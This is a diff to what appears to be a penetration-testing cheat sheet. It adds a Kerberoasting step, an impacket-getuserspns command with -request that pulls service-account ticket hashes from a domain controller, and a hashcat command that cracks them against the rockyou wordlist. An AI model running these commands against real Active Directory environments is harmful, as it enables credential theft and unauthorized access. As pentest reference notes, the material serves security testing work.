@@ -662,4 +662,11 @@ klist
 ```
 impacket-getuserspns domain.local/username:password -dc-host dc01.domain.local -k -no-pass
 ```
+```
+impacket-getuserspns domain.local/username:password -dc-host dc01.domain.local -k -no-pass -request
+```
+- Crack hash
+```
+hashcat hash.txt rockyou.txt
+```
 
